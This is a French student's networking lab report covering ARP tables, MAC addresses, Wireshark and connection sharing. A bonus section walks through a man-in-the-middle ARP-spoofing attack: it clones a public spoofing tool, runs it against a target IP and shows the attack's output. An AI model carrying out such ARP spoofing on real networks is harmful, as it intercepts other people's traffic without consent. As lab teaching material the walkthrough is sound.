

##### ❓ ️ Avant de continuer...

- affichez l'adresse MAC de votre carte WiFi !
```powershell
C:\Users\enzob>ipconfig /all

Carte réseau sans fil Wi-Fi :

   Description. . . . . . . . . . . . . . : Intel(R) Wi-Fi 6E AX211 160MHz
   Adresse physique . . . . . . . . . . . : FA-BB-C3-8E-EA-13
```

##### ❓ Affichez votre table ARP

- allez vous commencez à devenir grands, je vous donne pas la commande, demande à m'sieur internet !
```powershell
PS C:\Users\enzob> arp -a

Interface : 10.33.65.120 --- 0xe
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.79.14           d4-d8-53-78-45-b0     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```


##### ❓ Déterminez l'adresse MAC de la passerelle du réseau de l'école

- la passerelle, vous connaissez son adresse IP normalement (cf TP1 ;) )
si vous avez un accès internet, votre PC a forcément l'adresse MAC de la passerelle dans sa table ARP

passerelle :
- IP : 10.33.79.254
- MAC : 7c-5a-1c-d3-d8-76

##### ❓ Supprimez la ligne qui concerne la passerelle

- une commande pour supprimer l'adresse MAC de votre table ARP

```powershell
PS C:\Windows\system32>  arp -d 10.33.79.14
```
- si vous ré-affichez votre table ARP, y'a des chances que ça revienne presque tout de suite !

##### ❓ Prouvez que vous avez supprimé la ligne dans la table ARP

en affichant la table ARP :

J'ai pour ce test supprimer mon collegue de ma table ARP ```10.33.79.14```
```powershell
PS C:\Users\enzob> arp -a

Interface : 10.33.65.120 --- 0xe
  Adresse Internet      Adresse physique      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  10.33.79.255          ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

##### ❓ Wireshark

- capture (arp1.pcap) [arp1.pcap]

lancez une capture Wireshark, puis supprimez la ligne de la passerelle dans la table ARP pendant que la capture est en cours
la capture doit contenir uniquement 2 trames :

un ARP request que votre PC envoie pour apprendre l'adresse MAC de la passerelle
et la réponse



## 1. Basics

##### ❓ Déterminer

- pour la carte réseau impliquée dans le partage de connexion (carte WiFi ?)
- son adresse IP au sein du réseau local formé par le partage de co

```powershell
PS C:\Users\enzob> ipconfig

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6 de liaison locale. . . . .: fe80::d106:7b93:2d6f:1a4c%14
   -> Adresse IPv4. . . . . . . . . . . . . .: 192.168.87.89
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   -> Passerelle par défaut. . . . . . . . . : 192.168.87.203
```

son adresse MAC

```82-ea-80-64-7f-ae```

##### ❓ DIY

- Changer votre adresse IP 
```powershell
PS C:\Users\enzob> ipconfig

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6 de liaison locale. . . . .: fe80::d106:7b93:2d6f:1a4c%14
   -> Adresse IPv4. . . . . . . . . . . . . .: 192.168.87.15
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : 192.168.87.203
```

##### ❓Pingz !

```powershell
PS C:\Users\enzob> ping 192.168.87.97

Envoi d’une requête 'Ping'  192.168.87.97 avec 32 octets de données :
Réponse de 192.168.87.97 : octets=32 temps=11 ms TTL=128
Réponse de 192.168.87.97 : octets=32 temps=5 ms TTL=128
Réponse de 192.168.87.97 : octets=32 temps=4 ms TTL=128
Réponse de 192.168.87.97 : octets=32 temps=7 ms TTL=128

Statistiques Ping pour 192.168.87.97:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 4ms, Maximum = 11ms, Moyenne = 6ms
```

```powershell
PS C:\Users\enzob> ping 192.168.87.34

Envoi d’une requête 'Ping'  192.168.87.34 avec 32 octets de données :
Réponse de 192.168.87.34 : octets=32 temps=12 ms TTL=128
Réponse de 192.168.87.34 : octets=32 temps=34 ms TTL=128
Réponse de 192.168.87.34 : octets=32 temps=7 ms TTL=128
Réponse de 192.168.87.34 : octets=32 temps=7 ms TTL=128

Statistiques Ping pour 192.168.87.34:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 7ms, Maximum = 34ms, Moyenne = 15ms
```

##### ❓ Affichez votre table ARP !

```powershell
PS C:\Users\enzob> arp -a

Interface : 192.168.87.15 --- 0xe
  Adresse Internet      Adresse physique      Type
  -> 192.168.87.34         c8-8a-9a-e6-33-1d     dynamique
  -> 192.168.87.97         74-13-ea-8e-bb-06     dynamique
  192.168.87.203        82-ea-80-64-7f-ae     dynamique
```

## Bonus

Pour ce travail j'ai utilisé 2 manières sur l'OS **KALI** !

##### ❓ Mettre en place un MITM

#### Ettercap :

En vraie, je vais juste donner un tuto, malgré tout, c'est sympa, on peut le faire avec toute ma maison.

https://www.youtube.com/watch?v=_44MLJMweig

#### Un script Python sur Github

Pour ce test, j'ai utilisé le dépôt " https://github.com/EONRaider/Arp-Spoofer "

Pour commencer je **clone** le Git
```bash
┌──(kali㉿kali)-[~/Desktop/test]
└─$ git clone https://github.com/EONRaider/Arp-Spoofer.git
Cloning into 'Arp-Spoofer'...
remote: Enumerating objects: 345, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 345 (delta 40), reused 36 (delta 36), pack-reused 300 (from 1)
Receiving objects: 100% (345/345), 85.35 KiB | 292.00 KiB/s, done.
Resolving deltas: 100% (209/209), done.
```

Une fois installer, je rentre dans mon dossier installer avec :
```bash
┌──(kali㉿kali)-[~/Desktop/test]
└─$ cd Arp-Spoofer
```

Pour trouver ma cible sur le réseau si je ne la connais pas, je peux utiliser [Nmap](https://www.varonis.com/fr/blog/nmap-commands) avant de s'attaquer à elle, mais ici, je connais déjà ma cible `192.168.51.171`.

Maintenant, que j'ai ma cible, je peux attaquer, ce script va automatiquement trouver ma passerelle, pour attaquer je n'est juste qu'à entrée `sudo python3 arpspoof.py [IP DE MA CIBLE] -f` en oublient pas de changer l'adresse IP de ma cible :

```bash
┌──(kali㉿kali)-[~/Desktop/test/Arp-Spoofer]
└─$ sudo python3 arpspoof.py 192.168.51.171 -f
[sudo] password for kali:

[>>>] ARP Spoofing configuration:
[+] IPv4 Forwarding .....................True
[+] Interface       .....................eth0
[+] Attacker MAC    ........08:00:27:ff:8e:e7
[+] Gateway IP      ............192.168.51.15
[+] Gateway MAC     ........82:ea:80:64:7f:ae
[+] Target IP       ...........192.168.51.171
[+] Target MAC      ........08:00:27:c2:7f:3b

[!] ARP packets ready. Execute the attack with these settings? (Y/N)
```

Ici, il a bien trouvé la passerelle et sont adresse mac, de même pour ma cible, j'appuie sur " Y " et je fait entrée pour confirmé :

```bash
[!] ARP packets ready. Execute the attack with these settings? (Y/N) y

[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
```
TADA ! ça marche !

Je peux maintenant ouvrir [wireshark](https://www.wireshark.org/docs/) dans ma VM Hôte pour voir tout les pâques envoyées par ma cible !
